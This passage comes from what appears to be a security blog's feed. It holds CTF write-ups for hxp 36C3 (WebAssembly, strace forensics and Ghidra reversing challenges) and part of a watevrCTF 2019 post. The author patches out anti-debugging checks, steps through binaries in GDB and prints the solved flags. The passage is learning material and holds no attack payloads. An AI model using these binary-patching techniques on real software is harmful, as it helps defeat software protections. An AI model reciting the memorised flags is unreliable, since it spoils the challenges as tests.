&lt;p&gt;Opening the html file directly in the browser wasn&amp;rsquo;t loading the js file due to CORS. I copied the folder into my &lt;code&gt;/var/www/html&lt;/code&gt; folder and accessed it from there using localhost.&lt;/p&gt;
&lt;p&gt;First I set a breakpoint at line 71 of the hxp2019.js file.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-12-30_hxp-36c3-ctf/images/debug1.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-12-30_hxp-36c3-ctf/images/debug1.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;Stepping through the code line by line, we then get into the wasm code after line 73, i.e the wasm.check() function which passes the address where our input flag is stored and the length of the input. After this, on stepping into it, our code jumps into the wasm code.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-12-30_hxp-36c3-ctf/images/debug2.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-12-30_hxp-36c3-ctf/images/debug2.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;Stepping through each line (and after having done this over and over many times, I kind of understood what each line of the code was doing), we reach line 12 where actually our length of input is being checked with 50. So, we have to make our input length 50. We supply a dummy flag &lt;code&gt;hxp{45 times &#39;a&#39;}&lt;/code&gt;. Then we see that on stepping throght the code, and doing a lot of calculations on some array stored in memory, each character of our input is sequentially comapred with another character. The character to be compared with is loaded at line 284.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-12-30_hxp-36c3-ctf/images/debug3.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-12-30_hxp-36c3-ctf/images/debug3.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;














&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-12-30_hxp-36c3-ctf/images/debug4.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-12-30_hxp-36c3-ctf/images/debug4.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;Here, we see that the first character (&amp;lsquo;a&amp;rsquo; = 97) is to be compared with (109 = &amp;lsquo;m&amp;rsquo;). What I did next, may not be the right way, but I was so excited that I had made progress was that I did this whole process 45 times, adding one character to my &amp;ldquo;flag&amp;rdquo; at a time until I had all characters of the flag. I had tried changing the code at line 288 to &lt;code&gt;br_if 1&lt;/code&gt; but that seemed to crash somewhere. Anyways, whatever works during the CTF :stuck_out_tongue:.&lt;/p&gt;
&lt;p&gt;The flag was - &lt;code&gt;hxp{merry_xmas___github.com/benediktwerner/rewasm}&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;This could probably be the author of the chllenge as the repo is wasm reverse engineering tool. Loved the challenge!&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;junior-ctf&#34;&gt;Junior CTF&lt;/h1&gt;
&lt;h2 id=&#34;tracer---forensics&#34;&gt;tracer - Forensics&lt;/h2&gt;
&lt;p&gt;File: &lt;a href=&#34;https://shreyansh26.github.io/post/2019-12-30_hxp-36c3-ctf/files/tracer&#34;&gt;file&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;The file looks like strace running on some process. I decided to scroll right to the very bottom and saw&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;541   write(1, &amp;quot;\&amp;quot;Flag\&amp;quot;&amp;quot;, 6)           = 6
541   write(1, &amp;quot; [New] 1L, 24C written&amp;quot;, 22) = 22
541   write(3, &amp;quot;b0VIM 8.0\0\0\0\0\20\0\0\0\0\0\0\0\0\0\0\35\2\0\0root&amp;quot;..., 4096) = 4096
541   write(4, &amp;quot;# This viminfo file was generate&amp;quot;..., 1035) = 1035
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This meant that at the end something was being written to a file named Flag using vim. I started looking at the preceeding lines and saw text or vim commands being typed in (i.e the read command). From line no. 65782, is the interetsing part. This has &amp;lsquo;i&amp;rsquo; bein read, which is the command for insert in vim, that is typing began from here.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-12-30_hxp-36c3-ctf/images/vim.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-12-30_hxp-36c3-ctf/images/vim.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;Now all I did was to focus on the &lt;code&gt;read&lt;/code&gt; commands and type in whatever that was read on my local computer in vim. I treated &lt;code&gt;\33&lt;/code&gt; as escape and just typed in whatever was being given as input as in the trace file.&lt;/p&gt;
&lt;p&gt;Eventually I ended with some text which seemed meaningful, there was some slight error whic I fixed by intuition.&lt;/p&gt;
&lt;p&gt;The flag was - &lt;code&gt;junior-nanoiswayBETTER!&lt;/code&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;h2 id=&#34;maybe---rev&#34;&gt;maybe - Rev&lt;/h2&gt;
&lt;p&gt;File: &lt;a href=&#34;https://shreyansh26.github.io/post/2019-12-30_hxp-36c3-ctf/files/chal1&#34;&gt;chal1&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;We open up the file in Ghidra and head to the main function.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-12-30_hxp-36c3-ctf/images/rev11.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-12-30_hxp-36c3-ctf/images/rev11.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;Basically, if we see, the function is not doing anything, it is just taking our input of length 0x24 as a command line argument, then storing it at a +0x40 offset from a fixed string in memory, i.e. &amp;ldquo;junior-totally_the_flag_or_maybe_not&amp;rdquo;. The rest of the computations don&amp;rsquo;t mean anything as uvar3, ivar1, all are keeping the input unchanged. But the program still outputs &amp;ldquo;wrong!&amp;rdquo; and there does not seem to be any checking.&lt;/p&gt;
&lt;p&gt;After this I opened up GDB to analyse the flow. I set a breakpoint at the main function, and observed something interesting.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-12-30_hxp-36c3-ctf/images/re12.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-12-30_hxp-36c3-ctf/images/re12.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;The fixed string &amp;ldquo;junior-totally_the_flag_or_maybe_not&amp;rdquo; is now changed to &amp;ldquo;ton_ebyam_ro_galf__flag_or_maybe_not&amp;rdquo;. This has to be because of some code running before main. Heading back to Ghidra, I opened the &lt;code&gt;_INIT_0&lt;/code&gt; and &lt;code&gt;_INIT_1&lt;/code&gt; functions since they run before the entry point is reached. The &lt;code&gt;_INIT_1&lt;/code&gt; function was the required code.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-12-30_hxp-36c3-ctf/images/re13.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-12-30_hxp-36c3-ctf/images/re13.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;So, now after struggling for some time on the input evaluation part, I checked the &lt;code&gt;_FINI_0&lt;/code&gt; and &lt;code&gt;_FINI_1&lt;/code&gt; functions as well, as they run just before the end of the program. The &lt;code&gt;_FINI_1&lt;/code&gt; function had the required code.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-12-30_hxp-36c3-ctf/images/re14.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-12-30_hxp-36c3-ctf/images/re14.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;Here we see that the string &amp;ldquo;ton_ebyam_ro_galf__flag_or_maybe_not&amp;rdquo; is XORed with our input string at offset +0x40. This is then compared with alternate elements of the array &lt;code&gt;&amp;amp;DAT_003010a0&lt;/code&gt;. The array contents are&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;b = [0x1E ,0x00 ,0x1A ,0x00 ,0x00 ,0x00 ,0x36 ,0x00 ,0x0A ,0x00 ,0x10 ,0x00 ,0x54 ,0x00 ,0x00 ,0x00 ,0x01 ,0x00 ,0x33 ,0x00 ,0x17 ,0x00 ,0x1C ,0x00 ,0x00 ,0x00 ,0x09 ,0x00 ,0x14 ,0x00 ,0x1E ,0x00 ,0x39 ,0x00 ,0x34 ,0x00 ,0x2A ,0x00 ,0x05 ,0x00 ,0x04 ,0x00 ,0x04 ,0x00 ,0x09 ,0x00 ,0x3D ,0x00 ,0x03 ,0x00 ,0x17 ,0x00 ,0x3C ,0x00 ,0x05 ,0x00 ,0x3E ,0x00 ,0x14 ,0x00 ,0x03 ,0x00 ,0x03 ,0x00 ,0x36 ,0x00 ,0x0F ,0x00 ,0x4E ,0x00 ,0x55 ,0x00]&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;So, all we have to do is XOR the fixed string with the alternate elements of this array and that should give us our flag.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ton_ebyam_ro_galf__flag_or_maybe_not&amp;#34;&lt;/span&gt;

b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;0x1E&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x1A&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x36&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x0A&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x10&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x54&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x01&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x33&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x17&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x1C&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x09&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x14&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x1E&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x39&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x34&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x2A&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x05&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x04&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x04&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x09&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x3D&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x03&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x17&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x3C&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x05&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x3E&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x14&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x03&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x03&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x36&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x0F&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x4E&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x55&lt;/span&gt; ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt;]

flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;

b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; b[::&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;]
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(len(b)):
    flag &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; chr(b[i] &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; ord(a[i]))


&lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(flag)
&lt;span style=&#34;color:#75715e&#34;&gt;# &amp;#39;junior-alles_nur_kuchenblech_mafia!!&amp;#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The flag is - &lt;code&gt;junior-alles_nur_kuchenblech_mafia!!&lt;/code&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;I had great fun solving this CTF. Learnt a ton! This was my last CTF and blog post for 2019.&lt;/p&gt;
&lt;p&gt;2020 will see a lot more blog posts, writeups and some interesting security research too. Till then, sayonara.&lt;/p&gt;
&lt;script type=&#34;text/javascript&#34; src=&#34;//downloads.mailchimp.com/js/signup-forms/popup/unique-methods/embed.js&#34; data-dojo-config=&#34;usePlainJson: true, isDebug: false&#34;&gt;&lt;/script&gt;
&lt;!-- &lt;button style=&#34;background-color: #70ab17; color: #1770AB&#34; id=&#34;openpopup&#34;&gt;Subscribe to my posts!&lt;/button&gt; --&gt;
&lt;div class=&#34;button_cont&#34; align=&#34;center&#34;&gt;&lt;button id=&#34;openpopup&#34; class=&#34;example_a&#34;&gt;Subscribe to my posts!&lt;/button&gt;&lt;/div&gt;
&lt;style&gt;
    .example_a {
        color: #fff !important;
        text-transform: uppercase;
        text-decoration: none;
        background: #3f51b5;
        padding: 20px;
        border-radius: 5px;
        cursor: pointer;
        display: inline-block;
        border: none;
        transition: all 0.4s ease 0s;
    }

    .example_a:hover {
        background: #434343;
        letter-spacing: 1px;
        -webkit-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);
        -moz-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);
        box-shadow: 5px 40px -10px rgba(0,0,0,0.57);
        transition: all 0.4s ease 0s;
    }
&lt;/style&gt;
&lt;script type=&#34;text/javascript&#34;&gt;

function showMailingPopUp() {
    window.dojoRequire([&#34;mojo/signup-forms/Loader&#34;], function(L) { L.start({&#34;baseUrl&#34;:&#34;mc.us4.list-manage.com&#34;,&#34;uuid&#34;:&#34;0b10ac14f50d7f4e7d11cf26a&#34;,&#34;lid&#34;:&#34;667a1bb3da&#34;,&#34;uniqueMethods&#34;:true}) })

    document.cookie = &#34;MCPopupClosed=;path=/;expires=Thu, 01 Jan 1970 00:00:00 UTC&#34;;
}

document.getElementById(&#34;openpopup&#34;).onclick = function() {showMailingPopUp()};

&lt;/script&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;Follow me on &lt;a href=&#34;https://twitter.com/shreyansh_26&#34;&gt;Twitter&lt;/a&gt;, &lt;a href=&#34;https://github.com/shreyansh26&#34;&gt;Github&lt;/a&gt; or connect on &lt;a href=&#34;https://www.linkedin.com/in/shreyansh26/&#34;&gt;LinkedIn&lt;/a&gt;.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>watevrCTF 2019 Writeups (Mainly Rev and Pwn)</title>
      <link>https://shreyansh26.github.io/post/2019-12-15_watevr-ctf-2019-writeups/</link>
      <pubDate>Sun, 15 Dec 2019 11:44:06 +0530</pubDate>
      <guid>https://shreyansh26.github.io/post/2019-12-15_watevr-ctf-2019-writeups/</guid>
      <description>&lt;p&gt;This was a very fun CTF. Kudos to the organizers. I loved the problems, very interesting as well as challenging. I played this CTF with my team, &lt;a href=&#34;https://ctftime.org/team/72103&#34;&gt;Abs0lut3Pwn4g3&lt;/a&gt;. Our final rank was 54th.&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;rev-challeneges&#34;&gt;Rev Challeneges&lt;/h1&gt;
&lt;h2 id=&#34;timeout&#34;&gt;Timeout&lt;/h2&gt;
&lt;p&gt;File: &lt;a href=&#34;https://shreyansh26.github.io/post/2019-12-15_watevr-ctf-2019-writeups/files/timeout&#34;&gt;timeout&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;The binary is unstripped, so we can easily see the main function. The disassembly looks something like this.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-12-15_watevr-ctf-2019-writeups/images/timeout_1.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-12-15_watevr-ctf-2019-writeups/images/timeout_1.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;The functions, &lt;code&gt;signal&lt;/code&gt;, &lt;code&gt;alarm&lt;/code&gt; and &lt;code&gt;delay&lt;/code&gt; all serve the same purpose, basically to either exit the program or delay its execution for a long time. We nop those out. So that our disassembly looks like this now.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-12-15_watevr-ctf-2019-writeups/images/timeout_2.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-12-15_watevr-ctf-2019-writeups/images/timeout_2.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;We see that there is a flag &lt;em&gt;can_continnue&lt;/em&gt; which is set to 0x539, but not used in the code again. Checking the functions, we find one as &lt;code&gt;generate&lt;/code&gt;, which uses this variable and generates the flag. Now solving this is simple using a debugger. Set a breakpoint before exiting and transfer execution to this function, using &lt;code&gt;set $rip = 0x4006a6&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;We get the flag - &lt;strong&gt;watevr{3ncrytion_is_overrated_youtube.com/watch?v=OPf0YbXqDm0}&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;h2 id=&#34;hacking-for-vodka&#34;&gt;Hacking For Vodka&lt;/h2&gt;
&lt;p&gt;File: &lt;a href=&#34;https://shreyansh26.github.io/post/2019-12-15_watevr-ctf-2019-writeups/files/vodka&#34;&gt;vodka&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;The binary has different functionalities when run normally and when run in a debugger. We know this because of the &lt;em&gt;ptrace&lt;/em&gt; call.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-12-15_watevr-ctf-2019-writeups/images/vodka_1.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-12-15_watevr-ctf-2019-writeups/images/vodka_1.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;I decide to analyse just the part which would have been evaded we were to run in a debugger, i.e the FUN_001012bf function. Inside that, there are a few more fuction calls and variables are set on stack. The intersesting part is the FUN_0010092a function.&lt;/p&gt;
&lt;p&gt;Inside that function, which looks very complicated, there is an fgets call which is used to get our input and a strcmp to validate the input.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-12-15_watevr-ctf-2019-writeups/images/vodka_2.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-12-15_watevr-ctf-2019-writeups/images/vodka_2.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;Also, there is a loop which suggests that the string to be matched with is constructed character by character. I use dynamic analysis, setting a breakpoint at the strcmp call, and checking at each step and modifying our input accordingly. Although the process is a bit tedious, but I still managed to get the flag string. Anything works during the CTF, as long as you get the flag :stuck_out_tongue:.&lt;/p&gt;
&lt;p&gt;PS - Before the dynamic analysis, we patch the &lt;code&gt;PTRACE_TRACEME&lt;/code&gt; call to jump to the required function.&lt;/p&gt;
&lt;p&gt;The flag is - &lt;strong&gt;watevr{th4nk5_h4ck1ng_for_s0ju_hackingforsoju.team}&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;h2 id=&#34;esrever&#34;&gt;esreveR&lt;/h2&gt;
&lt;p&gt;File: &lt;a href=&#34;https://shreyansh26.github.io/post/2019-12-15_watevr-ctf-2019-writeups/files/esrever&#34;&gt;esrever&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;This was a very fun challenge. When we open the binary, we see that the main function is heavily obfuscated. Not obfuscated in the true sense, but a lot is going on. For those using Ghidra, FUN_001018f3 is the main function. We see a lot of variables and a whole lot of precomputation. It is as late as in the 174th line that there is an fgets call to take our input.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-12-15_watevr-ctf-2019-writeups/images/reverse_1.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-12-15_watevr-ctf-2019-writeups/images/reverse_1.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;So, I set breakpoints at various places, to check what all is being computed. It is interesting that our input is used quite late in the code. It is used as a parameter to FUN_001012d8, which looks like something which will validate our input.&lt;/p&gt;
&lt;p&gt;On checking that function, there is a call to another function FUN_00100ba0 with a large number of parameters, formed by basic bit manipulations (using XOR) with the precomputed values. Our input string is also sent with it. Then we check this function FUN_00100ba0. It has 57 parameters. And in this we see that our input is checked each of the remaining 56 parameters character wise. So, basically the 56 parameters is our flag.&lt;/p&gt;
&lt;p&gt;Again, dynamic analysis was key here.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-12-15_watevr-ctf-2019-writeups/images/reverse_2.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-12-15_watevr-ctf-2019-writeups/images/reverse_2.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;Before the function call, the parameters are pushed onto the stack. We read these values by printing a larger number of values form &lt;code&gt;$ebp-0x10&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Tha flag was - &lt;strong&gt;watevr{esrever_reversed_youtube.com/watch?v=I8ijb4Zee5E}&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;h2 id=&#34;watshell&#34;&gt;watshell&lt;/h2&gt;
&lt;p&gt;File: &lt;a href=&#34;https://shreyansh26.github.io/post/2019-12-15_watevr-ctf-2019-writeups/files/watshell&#34;&gt;watshell&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;In this problem, we have to send an input to the service, which will be decrypted, checked against a fixed string - &amp;ldquo;give_me_the_flag_please&amp;rdquo;, and only then do we get the flag.&lt;/p&gt;
&lt;p&gt;So, I started at the main function FUN_0010178b. Again like, the first problem, Timeout, there are a few inital timeout checks, which I patched. There is some precomputation being done before we enter our input.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-12-15_watevr-ctf-2019-writeups/images/watshell_1.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-12-15_watevr-ctf-2019-writeups/images/watshell_1.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;&lt;code&gt;strtok&lt;/code&gt; is used here, which is used to split the string at some delimiter. And also, &lt;code&gt;atol&lt;/code&gt; is used to convert each such substring to a number. The delimiter here is 0x20, i.e. a space. So we have to supply our input &amp;ldquo;command&amp;rdquo; as space separated numbers.&lt;/p&gt;
&lt;p&gt;We use dynamic analysis after we give our input, since all the precomputations are done, we don&amp;rsquo;t have to worry about that. We jump straight to the function call to FUN_001011af. On a sample input of &lt;em&gt;10 11 12 13 14 15 16&lt;/em&gt;, the following parameters are passed -&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;0x5555555551af (
   $rdi = 0x00007fffffffd370 → 0x000000000000000a,
   $rsi = 0x0000000000000040,
   $rdx = 0x0000000000000000,
   $rcx = 0x00007fffffffd350 → 0x000000000000008f
)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;i.e. the pointer to the numbers, the (number of space separeted numbers + 1)*8, 0 and a precomputed array&amp;rsquo;s pointer, with the first element as 0x8f.&lt;/p&gt;
&lt;p&gt;Now I analysed FUN_001011af, it has two malloc calls to get the buffer to store the decrypted string. After some basic checks, there is a call to FUN_00100dc3.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-12-15_watevr-ctf-2019-writeups/images/watshell_2.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-12-15_watevr-ctf-2019-writeups/images/watshell_2.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;The parameters passed are -&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;0x555555554dc3 (
   $rdi = 0x000000000000000a,    // inp
   $rsi = 0x0000000000000071,    // arr_ele2
   $rdx = 0x000000000000008f,    // arr_ele1
   $rcx = 0x0000000000000071
)
